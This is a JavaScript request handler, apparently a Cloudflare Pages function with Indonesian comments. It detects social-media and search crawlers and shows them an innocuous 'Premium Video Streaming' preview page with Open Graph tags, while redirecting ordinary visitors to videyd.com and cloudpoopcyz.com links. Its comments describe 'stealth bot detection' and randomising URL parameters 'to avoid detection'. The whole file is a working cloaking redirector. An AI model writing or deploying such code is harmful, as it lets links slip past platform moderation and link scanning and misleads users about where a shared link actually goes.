export async function onRequest(context) {
  try {
    const { request } = context;
    const url = new URL(request.url);
    const path = url.pathname;
    
    // ✅ IMPROVED STEALTH BOT DETECTION
    const isLikelyBot = detectBot(request);

    console.log(`🤖 Bot detected: ${isLikelyBot}`);

    // Test mode untuk debug
    if (url.searchParams.has('debug')) {
      return debugInfo(request, isLikelyBot);
    }

    if (isLikelyBot) {
      // 🛡️ BOT: Improved natural content
      return serveBotContent(path);
    } else {
      // 👤 HUMAN: Redirect dengan delay
      return serveHumanRedirect(path);
    }
  } catch (error) {
    console.error('Error:', error);
    return new Response('Error', { status: 500 });
  }
}

// ✅ IMPROVED BOT DETECTION
function detectBot(request) {
  const userAgent = request.headers.get('user-agent') || '';
  const referer = request.headers.get('referer') || '';
  const accept = request.headers.get('accept') || '';
  
  // Bot indicators
  const botPatterns = [
    'Twitterbot', 'facebookexternalhit', 'WhatsApp',
    'TelegramBot', 'Discordbot', 'Slackbot',
    'Googlebot', 'Bingbot', 'DuckDuckBot', 'bot', 'crawl'
  ];
  
  // Human indicators
  const isLikelyHuman = userAgent.includes('Mozilla/5.0') && 
                       accept.includes('text/html') &&
                       !botPatterns.some(pattern => userAgent.includes(pattern));
  
  return !isLikelyHuman || referer.includes('t.co');
}

// ✅ RANDOM DELAY FUNCTION
function getRandomDelay(isBot) {
  if (isBot) {
    // Bot: 3-8 detik (lebih natural)
    return Math.floor(Math.random() * 5) + 3;
  } else {
    // Human: 1-3 detik
    return Math.floor(Math.random() * 2) + 1;
  }
}

// ✅ IMPROVED BOT CONTENT - LEBIH NATURAL
function serveBotContent(path) {
  const contentId = path.split('/').pop() || 'default';
  const targetUrl = getTargetUrl(path);
  const delay = getRandomDelay(true);
  
  const html = `<!DOCTYPE html>
<html prefix="og: http://ogp.me/ns#">
<head>
    <title>Video Streaming Platform - Watch HD Content</title>
    <meta charset="utf-8">
    
    <!-- 🎯 IMPROVED META TAGS -->
    <meta name="description" content="Stream HD videos with premium quality. Join millions of users enjoying our content library.">
    <meta property="og:title" content="Premium Video Streaming">
    <meta property="og:description" content="Watch your favorite videos in HD quality with seamless streaming experience">
    <meta property="og:type" content="video.other">
    <meta property="og:site_name" content="VideoStream">
    <meta property="og:image" content="https://via.placeholder.com/1200x630/667eea/ffffff?text=Video+Stream">
    <meta property="og:url" content="https://yourdomain.com${path}">
    
    <!-- 🎯 TWITTER CARD IMPROVED -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Premium Video Streaming">
    <meta name="twitter:description" content="Watch HD videos with premium streaming quality">
    <meta name="twitter:image" content="https://via.placeholder.com/1200x630/667eea/ffffff?text=Video+Stream">
    
    <!-- 🛡️ NATURAL REDIRECT -->
    <meta http-equiv="refresh" content="${delay};url=${targetUrl}">
    
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .content-card {
            background: rgba(255, 255, 255, 0.95);
            color: #333;
            border-radius: 12px;
            padding: 40px;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            backdrop-filter: blur(10px);
        }
        .video-placeholder {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 60px 20px;
            margin: 20px 0;
            border: 2px dashed #dee2e6;
        }
        .btn-primary {
            background: #667eea;
            color: white;
            padding: 12px 30px;
            border-radius: 25px;
            text-decoration: none;
            display: inline-block;
            margin: 15px 0;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        .loading-bar {
            width: 100%;
            height: 4px;
            background: #e9ecef;
            border-radius: 2px;
            margin: 20px 0;
            overflow: hidden;
        }
        .loading-progress {
            width: 70%;
            height: 100%;
            background: #667eea;
            border-radius: 2px;
            animation: loading 2s ease-in-out infinite;
        }
        @keyframes loading {
            0% { transform: translateX(-100%); }
            50% { transform: translateX(0%); }
            100% { transform: translateX(100%); }
        }
        .content-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            font-family: 'Monaco', 'Consolas', monospace;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="content-card">
        <h1 style="color: #2c5aa0; margin-bottom: 10px;">🎬 Premium Video Content</h1>
        <p style="color: #666; margin-bottom: 20px;">Loading your HD streaming experience...</p>
        
        <div class="video-placeholder">
            <div style="font-size: 48px; margin-bottom: 10px; color: #667eea;">📹</div>
            <p style="color: #6c757d; margin: 0;">Video Player Loading</p>
        </div>
        
        <div class="loading-bar">
            <div class="loading-progress"></div>
        </div>
        
        <div class="content-info">
            Content ID: <strong>${contentId}</strong><br>
            Status: <span style="color: #28a745;">✓ Ready to stream</span>
        </div>
        
        <a href="${targetUrl}" class="btn-primary">▶ Watch Video Now</a>
        
        <p style="color: #666; font-size: 14px; margin-top: 20px;">
            Preparing your content... Redirecting in ${delay} seconds
        </p>
    </div>
    
    <script>
        // Natural user behavior simulation
        setTimeout(function() {
            // Simulate click after 2 seconds
            document.querySelector('.btn-primary').style.backgroundColor = '#5a67d8';
        }, 2000);
    </script>
</body>
</html>`;

  return new Response(html, {
    headers: { 
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'public, max-age=1800' // 30 menit
    }
  });
}

// ✅ HUMAN REDIRECT - SIMPLE & CLEAN
function serveHumanRedirect(path) {
  const targetUrl = getTargetUrl(path);
  const delay = getRandomDelay(false);
  
  const html = `<!DOCTYPE html>
<html>
<head>
    <title>Redirecting to Video Content...</title>
    <meta http-equiv="refresh" content="${delay};url=${targetUrl}">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: #f8f9fa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        .loader {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        .text {
            color: #666;
            margin: 10px 0;
        }
        .small {
            font-size: 0.8em;
            color: #999;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <div class="text">Loading your content...</div>
        <div class="small">Please wait</div>
    </div>
    
    <script>
        // Fallback redirect
        setTimeout(function() {
            window.location.href = "${targetUrl}";
        }, ${delay * 1000});
    </script>
</body>
</html>`;

  return new Response(html, {
    headers: { 'Content-Type': 'text/html; charset=utf-8' }
  });
}

// ✅ GET TARGET URL - DENGAN PARAMETER VARIASI
function getTargetUrl(path) {
  if (path.startsWith('/s/')) {
    const contentId = path.substring(3);
    
    // Randomize parameters untuk avoid detection
    const params = new URLSearchParams({
      lv1: 'videyb.com',
      ref: 'social',
      t: Date.now().toString().slice(-6),
      v: '1'
    });
    
    return `https://www.videyd.com/e/${contentId}?${params.toString()}#_`;
  } else if (path.startsWith('/d/')) {
    return 'https://cloudpoopcyz.com/d/' + path.substring(3);
  } else {
    return 'https://videyd.com/';
  }
}

// ✅ DEBUG FUNCTION
function debugInfo(request, isBot) {
  const info = {
    userAgent: request.headers.get('user-agent'),
    referer: request.headers.get('referer'),
    accept: request.headers.get('accept'),
    isBot: isBot,
    timestamp: new Date().toISOString(),
    detection: {
      hasMozilla: request.headers.get('user-agent')?.includes('Mozilla/5.0'),
      hasBotKeywords: ['Twitterbot', 'facebookexternalhit', 'WhatsApp'].some(bot => 
        request.headers.get('user-agent')?.includes(bot)
      ),
      fromTwitter: request.headers.get('referer')?.includes('t.co')
    }
  };
  
  return new Response(JSON.stringify(info, null, 2), {
    headers: { 'Content-Type': 'application/json' }
  });
}
